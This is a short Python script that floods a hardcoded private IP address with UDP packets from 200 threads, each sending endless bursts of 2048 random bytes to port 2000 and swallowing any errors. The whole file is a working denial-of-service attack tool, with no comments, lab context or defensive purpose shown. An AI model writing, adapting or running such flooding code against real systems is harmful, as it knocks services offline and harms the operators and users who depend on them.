import socket
import random
import threading 

IP = '172.21.210.74'
PORT = 2000
BYTES = random._urandom(2048)

def attack():
  while True:
    try:
      sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      
      sock.connect((IP, PORT))

      for index in range (1000):
        sock.send(BYTES)
    except:
      sock.close()

for n in range (200):
  thread = threading.Thread(target = attack)
  thread.start()
